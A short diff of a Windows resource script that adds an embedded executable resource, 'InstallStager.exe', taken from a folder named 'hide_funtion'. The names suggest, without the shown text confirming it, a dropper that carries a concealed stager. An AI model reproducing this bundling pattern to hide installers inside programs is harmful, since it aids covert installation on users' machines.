@@ -55,10 +55,10 @@ IDR_DLL1                DLL                     "file\\libuv.dll"
 
 /////////////////////////////////////////////////////////////////////////////
 //
-// EXE
+// INSTALLSTAGER
 //
 
-
+IDR_INSTALLSTAGER1      INSTALLSTAGER           "file\\hide_funtion file\\InstallStager.exe"
 
 #endif    // 中文(简体，中国) resources
 /////////////////////////////////////////////////////////////////////////////
